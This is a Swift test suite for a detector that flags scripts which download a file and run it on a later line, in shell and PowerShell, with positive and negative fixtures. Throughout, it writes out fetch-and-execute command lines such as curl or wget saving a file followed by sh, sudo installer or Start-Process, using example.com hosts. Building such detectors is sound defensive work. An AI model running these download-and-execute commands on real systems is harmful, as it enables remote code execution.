import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

// A download on one line and the run of the file it saved on a later line (decision 029, the split
// download-then-run rule). Every fixture is synthetic: the hosts are example domains and the payloads are
// the word "hello". Paths in PowerShell use raw strings so the backslashes stay literal.

@Suite("Script effects: download and run split across lines (shell)")
struct ScriptEffectsSplitShellTests {
    static let positives: [ScriptCase] = [
        ScriptCase("curl -o, then sh on a later line", "curl -fsSL -o a.sh https://example.com/a\nsh a.sh\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("curl --output, then bash", "curl --output a.sh https://example.com/a\nbash a.sh\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("curl redirected to a file, then bash", "curl -fsSL https://example.com/i > run.sh\nbash run.sh\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("wget -O, then source", "wget -O env.sh https://example.com/e\n\n. ./env.sh\n", [.downloadAndRun(1, at: [3])]),
        ScriptCase("wget --output-document, then bash", "wget --output-document=a.sh https://example.com/a\nbash a.sh\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("chmod and a run by path", "curl -fsSL -o run https://example.com/r\nchmod +x run\n./run\n", [.downloadAndRun(1, at: [3])]),
        ScriptCase("chmod 755 and a bare run", "wget -O ./run https://example.com/r\nchmod 755 ./run\nrun\n", [.downloadAndRun(1, at: [3])]),
        ScriptCase("run through sudo", "curl -o a.sh https://example.com/a\nsudo sh a.sh\n",
                   [.downloadAndRun(1, at: [2]), .elevates(1, at: [2])]),
        ScriptCase("a double-quoted path on both lines", "curl -fsSL -o \"$TMPDIR/a.sh\" https://example.com/a\nsh \"$TMPDIR/a.sh\"\n",
                   [.downloadAndRun(1, at: [2])]),
        ScriptCase("a braced variable on both lines", "curl -o ${TMPDIR}/a.sh https://example.com/a\nsh ${TMPDIR}/a.sh\n",
                   [.downloadAndRun(1, at: [2])]),
        ScriptCase("a home-relative path on both lines", "curl -o ~/a.sh https://example.com/a\nbash ~/a.sh\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("a run inside a later block", "curl -o a.sh https://example.com/a\nif true; then\n  sh a.sh\nfi\n", [.downloadAndRun(1, at: [3])]),
        ScriptCase("two downloads, two runs", "curl -o a.sh https://example.com/1\ncurl -o b.sh https://example.com/2\nsh b.sh\nsh a.sh\n",
                   [.downloadAndRun(2, at: [3, 4])]),
        ScriptCase("two downloads of one path, one run", "curl -o a.sh https://example.com/1\ncurl -o a.sh https://example.com/2\nsh a.sh\n",
                   [.downloadAndRun(1, at: [3])]),
        ScriptCase("a decoded file, then run", "printf 'aGVsbG8=' | base64 -d > a.sh\nsh a.sh\n", [.decodeAndRun(1, at: [2])]),
        ScriptCase("open of a package", "curl -fsSL -o App.pkg https://example.com/App.pkg\nopen App.pkg\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("installer -pkg through sudo", "curl -fsSL -o App.pkg https://example.com/App.pkg\nsudo installer -pkg App.pkg -target /\n",
                   [.downloadAndRun(1, at: [2]), .elevates(1, at: [2])]),
        ScriptCase("open of a command file", "curl -o run.command https://example.com/r\nopen run.command\n", [.downloadAndRun(1, at: [2])]),
        ScriptCase("open of an executable file that chmod made executable", "curl -o tool https://example.com/t\nchmod +x tool\nopen tool\n",
                   [.downloadAndRun(1, at: [3])])
    ]

    @Test(arguments: positives) func reportsARunOnALaterLine(_ scenario: ScriptCase) throws { try scenario.check() }

    static let negatives: [ScriptCase] = [
        ScriptCase("download, never run", "curl -fsSL -o a.sh https://example.com/a\necho done\n"),
        ScriptCase("a run of a different file", "curl -o a.sh https://example.com/a\nsh b.sh\n"),
        ScriptCase("a path that only looks similar", "curl -o a.sh https://example.com/a\nsh a.sh.bak\n"),
        ScriptCase("a run before the download", "sh a.sh\ncurl -o a.sh https://example.com/a\n"),
        ScriptCase("a direct run without chmod", "curl -o a.sh https://example.com/a\n./a.sh\n"),
        ScriptCase("chmod of another file", "curl -o a.sh https://example.com/a\nchmod +x b.sh\n./a.sh\n"),
        ScriptCase("a download saved to /dev/null", "curl -fsSL https://example.com/a > /dev/null\nsh a.sh\n"),
        ScriptCase("a run inside a comment", "curl -o a.sh https://example.com/a\n# sh a.sh\n"),
        ScriptCase("a run in here-document data", "curl -o a.sh https://example.com/a\ncat > notes.txt <<'EOF'\nsh a.sh\nEOF\n"),
        ScriptCase("a download inside echo", "echo curl -o a.sh https://example.com/a\nsh a.sh\n"),
        ScriptCase("a download inside quoted text", "echo \"curl -o a.sh https://example.com/a\"\nsh a.sh\n"),
        ScriptCase("a download inside a comment", "# curl -o a.sh https://example.com/a\nsh a.sh\n"),
        ScriptCase("a download in here-document data", "cat > notes.txt <<'EOF'\ncurl -o a.sh https://example.com/a\nEOF\nsh a.sh\n"),
        ScriptCase("open of a document", "curl -fsSL -o report.pdf https://example.com/r.pdf\nopen report.pdf\n"),
        ScriptCase("open of a command file without a download", "open run.command\n"),
        ScriptCase("installer without a download", "installer -pkg App.pkg -target /\n")
    ]

    @Test(arguments: negatives) func staysSilentWithoutARun(_ scenario: ScriptCase) throws { try scenario.check() }

    static let reportedOnce: [ScriptCase] = [
        ScriptCase("one-line form, then the same run again", "curl -fsSL -o a.sh https://example.com/a && sh a.sh\nsh a.sh\n",
                   [.downloadAndRun(1, at: [1])]),
        ScriptCase("one-line form, then a later run of a fresh download", "curl -o a.sh https://example.com/1 && sh a.sh\ncurl -o a.sh https://example.com/2\nsh a.sh\n",
                   [.downloadAndRun(2, at: [1, 3])]),
        ScriptCase("pipe and a split form", "curl https://example.com/1 | sh\ncurl -o a.sh https://example.com/2\nsh a.sh\n",
                   [.downloadAndRun(2, at: [1, 3])]),
        ScriptCase("a run repeated on later lines", "curl -o a.sh https://example.com/a\nsh a.sh\nsh a.sh\nsh a.sh\n",
                   [.downloadAndRun(1, at: [2])])
    ]

    @Test(arguments: reportedOnce) func reportsEachDownloadOnce(_ scenario: ScriptCase) throws { try scenario.check() }

    /// Downloads of `f0.sh` through `f<count-1>.sh`, one per line, then the text of `tail`.
    static func downloads(_ count: Int, then tail: String) -> String {
        (0..<count).map { "curl -fsSL -o f\($0).sh https://example.com/f\($0)\n" }.joined() + tail
    }

    @Test func aFileRememberedWithinTheLimitIsRun() throws {
        // 64 downloads fill the store; the first is still remembered when its run comes on line 65.
        let facts = try ScriptFixture.facts(Self.downloads(64, then: "sh f0.sh\n"))
        #expect(facts == [.downloadAndRun(1, at: [65])])
    }

    @Test func aFileForgottenPastTheLimitIsNotRun() throws {
        // A 65th download pushes the first one out of the store, so its later run is not reported.
        #expect(try ScriptFixture.facts(Self.downloads(65, then: "sh f0.sh\n")).isEmpty)
        // The newest download is still remembered.
        #expect(try ScriptFixture.facts(Self.downloads(65, then: "sh f64.sh\n")) == [.downloadAndRun(1, at: [66])])
    }
}

@Suite("Script effects: download and run split across lines (PowerShell)")
struct ScriptEffectsSplitPowerShellTests {
    static let positives: [ScriptCase] = [
        ScriptCase("Invoke-WebRequest -OutFile, then the call operator", #"Invoke-WebRequest -Uri https://example.com/a.ps1 -OutFile a.ps1"# + "\n& .\\a.ps1\n",
                   language: .powerShell, [.downloadAndRun(1, at: [2])]),
        ScriptCase("iwr, then dot-sourcing", "iwr https://example.com/e.ps1 -OutFile e.ps1\n. .\\e.ps1\n", language: .powerShell,
                   [.downloadAndRun(1, at: [2])]),
        ScriptCase("Invoke-RestMethod, then Start-Process", "Invoke-RestMethod -Uri https://example.com/a.exe -OutFile a.exe\nStart-Process a.exe\n",
                   language: .powerShell, [.downloadAndRun(1, at: [2])]),
        ScriptCase("a quoted path in Start-Process -FilePath", #"Invoke-WebRequest -Uri https://example.com/a.exe -OutFile "$env:TEMP\a.exe""# + "\n"
                   + #"Start-Process -FilePath "$env:TEMP\a.exe""# + "\n",
                   language: .powerShell, [.downloadAndRun(1, at: [2])]),
        ScriptCase("a quoted path in a call operator", "iwr https://example.com/a.ps1 -OutFile a.ps1\n& \"./a.ps1\"\n", language: .powerShell,
                   [.downloadAndRun(1, at: [2])]),
        ScriptCase("one-line form, then the same run again", "iwr https://example.com/a.ps1 -OutFile a.ps1; & .\\a.ps1\n& .\\a.ps1\n",
                   language: .powerShell, [.downloadAndRun(1, at: [1])]),
        ScriptCase("a run after a Write-Host line", "iwr https://example.com/a.ps1 -OutFile a.ps1\nWrite-Host ok\n& .\\a.ps1\n",
                   language: .powerShell, [.downloadAndRun(1, at: [3])])
    ]

    @Test(arguments: positives) func reportsARunOnALaterLine(_ scenario: ScriptCase) throws { try scenario.check() }

    static let negatives: [ScriptCase] = [
        ScriptCase("download, never run", "iwr https://example.com/a.ps1 -OutFile a.ps1\nGet-Content a.ps1\n", language: .powerShell),
        ScriptCase("a run of a different file", "iwr https://example.com/a.ps1 -OutFile a.ps1\n& .\\b.ps1\n", language: .powerShell),
        ScriptCase("a run inside a comment", "iwr https://example.com/a.ps1 -OutFile a.ps1\n# & .\\a.ps1\n", language: .powerShell),
        ScriptCase("a download inside a string", "Write-Host \"iwr https://example.com/a.ps1 -OutFile a.ps1\"\n& .\\a.ps1\n", language: .powerShell),
        ScriptCase("a run before the download", "& .\\a.ps1\niwr https://example.com/a.ps1 -OutFile a.ps1\n", language: .powerShell),
        ScriptCase("a request without an output file", "iwr https://example.com/a.ps1\n& .\\a.ps1\n", language: .powerShell),
        ScriptCase("Start-Process of a document", "iwr https://example.com/r.pdf -OutFile r.pdf\nStart-Process r.pdf\n", language: .powerShell),
        ScriptCase("Start-Process of a data file by -FilePath", "iwr https://example.com/d.csv -OutFile d.csv\nStart-Process -FilePath d.csv\n",
                   language: .powerShell)
    ]

    @Test(arguments: negatives) func staysSilentWithoutARun(_ scenario: ScriptCase) throws { try scenario.check() }
}
